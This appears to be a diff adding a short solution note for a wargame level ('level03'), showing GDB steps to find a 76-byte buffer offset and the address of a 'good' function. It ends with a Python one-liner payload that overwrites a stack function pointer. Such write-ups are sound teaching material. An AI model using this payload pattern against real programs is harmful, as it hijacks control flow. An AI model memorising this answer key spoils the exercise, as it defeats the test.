@@ -1,0 +1,13 @@
+
+1.) Use GDB to find the number of bytes between the begining of our buffer and the function pointer to overwrite on the stack
+    p ($ebp - 0xc) - ($ebp - 0x58)
+    = 76 bytes
+
+2.) Print the value of the good function, so we know what to overrite the pointer to:
+    p good
+    = $1 = {<text variable, no debug info>} 0x8048474 <good>
+
+3.) Create buffer string using python, remeber to reverse the byte order when writing the location in memory to jump to!
+
+Answer:   
+    /levels/level03 $(python -c 'print("A"*76 + "\x08\x04\x84\x74"[::-1])')
